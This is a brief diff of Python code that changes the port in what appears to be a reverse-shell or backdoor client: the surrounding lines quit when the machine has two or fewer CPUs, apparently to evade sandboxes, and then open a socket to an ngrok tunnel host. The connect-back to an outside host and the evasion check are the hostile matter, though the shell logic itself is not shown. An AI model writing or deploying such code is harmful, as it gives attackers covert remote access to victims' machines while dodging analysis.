@@ -6,7 +6,7 @@ if os.cpu_count() <= 2:
     quit()
 
 HOST = '0.tcp.ngrok.io'
-PORT = 12249
+PORT = 16685
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
